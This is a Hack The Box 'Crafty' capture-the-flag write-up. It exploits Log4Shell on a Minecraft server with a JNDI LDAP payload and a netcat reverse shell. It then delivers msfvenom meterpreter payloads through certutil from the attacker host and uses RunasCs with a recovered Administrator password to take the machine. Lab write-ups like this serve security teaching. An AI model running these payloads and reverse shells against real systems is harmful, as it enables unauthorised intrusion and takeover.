---
layout: post
section-type: post
has-comments: true
title: Hack The Box - Crafty
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps

#### Nmap Results

```
nmap 10.10.11.249 -p-
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/fbc9f2f4-73e7-4f98-9fb3-7856d3a97db9)

```
sudo nmap -p80,25565 -sV -sC 10.10.11.249
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4a79d415-09b1-46a8-8d79-2dbb2f999681)


I add crafty to `/etc/hosts` with the corresponding ip address given. Then navigate to `http://crafty.htb`

```
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

When I visited `crafty.htb`, I found a Minecraft introduction page.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4c649f78-9e8e-42b2-ac1d-7b782e8d63c0)


### Foothold
However, for `port 25565`, I recall there being a log4j vulnerability, `CVE-2021–44228` to be precise. This exploit enables control over log messages and parameters to execute arbitrary code. An exploit for this vulnerability can be found here.

```
git clone https://github.com/kozmer/log4j-shell-poc
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/be2f0fed-4ad2-48b6-bbf9-ccd312818f72)


Modify the `String cmd` variable to ensure compatibility with Windows.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/0f5a7e2e-8431-4bb8-bdca-a37c2d19fcfd)

In order for `poc.py` to run smoothly we need a java archive to be named `jdk1.8.0_20`. I found a java archive here

```
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
tar -xf jdk-8u181-linux-x64.tar.gz
mv jdk1.8.0_181 jdk1.8.0_20
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ea8c6034-046d-4403-be85-10b8293e35c4)

To connect to the server, I needed to download the Minecraft client on my Kali system. After conducting some research, I downloaded TLauncher. https://tlauncher.org/en/download_1/minecraft-1-16-5_12582.html (I don't recommend using this, but I proceeded anyway since I'm installing it on a VM.) 
And I used Minecraft 1.16.5 Java Edition as I knew it's vulnerable to log4j.

one download the TLauncher.zip file, unzip it and open it by runing below command:


```
sudo java -jar TLauncher.jar
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/468caa45-5db4-42da-88ae-68c589cff9ef)


![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/a5013fe2-04a9-4294-a7e9-4e607b6e33a7)

after that select the correct release version and fill the minecraft account name, then procced on `Enter the game`.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/edee156a-e103-44f7-8053-bff066a85aef)

Clicking on `Multiplayer` allowed me to enter the server.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b0c99b16-e72e-4528-9c4e-f2236aee7da5)

```
10.10.11.249:25565
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f5e39e36-ac3c-4c1f-ba00-cf4a648214b3)

I had to attempt logging in to the server multiple times, and each time I had to reset the box for it to function properly. Once I login to the server, I opened a terminal and ran the POC. and it will show a command (`${jndi:ldap://10.10.16.18:1389/a}`) I copied that.

```
python3 poc.py --userip <tun0 IP> --webport 80 --lport 4444
```

and open another terminal and create a netcat listener on port 4444

```
nc -nlvp 4444
```

then in minecraft, I press `t` (to send a message) and in the chat box i paste that copied command (`${jndi:ldap://10.10.16.18:1389/a}`), so in few second i got the reverse shell in my netcat listener.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3ffc0caf-9e4a-4e8a-9a97-b623affeb991)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1a10e978-4a64-48d8-9990-c9d7ed14e5a7)

in below screenshot you can see the whole process:

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/23388288-8ca3-4e85-bee1-e9a89d1c93c9)


### user.txt

So now we can obtain the `user.txt`

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/7a5af388-2200-4956-b3a8-e7d975ee4d1b)


### Privilege Escalation
While exploring the machine, I stumbled upon an interesting .jar file located in `C:\Users\svc_minecraft\server\plugins`.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/78997157-c6fc-469b-8f24-ee0420a08d67)

With my current shell I can’t download the file so I followed blow steps:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.18 LPORT=4244 -f exe -o exploit.exe
```
![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/a5bcbffd-24bd-4dd1-844a-be857100475b)

I then fired up Metasploit and did the following:

```
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.16.18
set lport 4244
run
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d7741354-3c76-4f9e-b23c-34be5ad4155d)

then spin up a python server on a separate tab to deliver `exploit.exe`.

```
python3 -m http.server 4245
```

Then run below command in the on the foothold shell. This command will grab the msfvenom `exploit.exe` and put it on the target machine.

```
certutil -urlcache -f http://10.10.16.18:4245/exploit.exe %temp%/exploit.exe
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ee451881-040e-4c5d-b5be-00dbfb815e1e)

Then run the `exploit.exe`.

```
start %temp%/exploit.exe
```
![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/c3eab181-c1d6-4c0a-ac68-26e5a02d6898)

BOOM! We got a stable shell through meterpreter. so now we can download the jar file.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/353fbe7a-0924-4094-93ff-1e722c95b04d)

If we want to find out what is in this file we need a Java Decompiler. The command for one is `jd-gui` and it is built into kali. This will open up a the decompiler for you. Click on `File` in the top right and click `Open File`. Find the .jar file and open it up.

```
sudo apt install jd-gui
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/7a7bff56-1900-4967-8f98-f0f0c038c0d0)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b18fe8df-bc3e-4d51-9b9f-3a88bd5b65be)

By opening this file with JD-GUI, I found a credential in the `Playercounter.class`.

Now We are going to use `RunasCs` which will allow us to run processes with different permissions that the ones we currently have. The goal is to initiate an Administrator shell from our current user `svc_minecraft`.

https://github.com/antonioCoco/RunasCs/releases

Download the version 1.5 `RunasCs.zip` from the embed above and run an unzip on it. We are going to be using the `RunasCs.exe` for this box.

Now create another msfvenom payload but for another `port 4246`.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.18 LPORT=4246 -f exe -o exploit2.exe
```
![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d0000b29-6ef8-4a8b-83db-735d6291f658)

On the meterpreter session you can try uploading to `\server\plugins` but it won’t work because of permissions. We need to make our way over to `\server\logs` so we can upload the new payload `exploit2.exe` and `RunasCs.exe`.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b6ac6bf3-1bbe-4976-9a48-d406a89e8645)


Open a new tab and launch Metasploit by typing `msfconsole`. Repeat the procedure from the previous Metasploit segment, this time configuring it to operate on port 4246. (listener)

```
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.16.18
set lport 4246
run
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/a6014e8b-2612-4f44-b33b-1c59a9e1730b)


Returning to our previous Meterpreter shell, execute the following commands:

```
.\RunasCs.exe Administrator s67u84zKq8IXw exploit2.exe
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/97461ca3-a774-4c70-b482-681643c17887)

BOOM!! We got the Administrator shell. as well as root flag !!!

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1a659854-4f70-4947-ab81-3eaf1ac5d8bc)








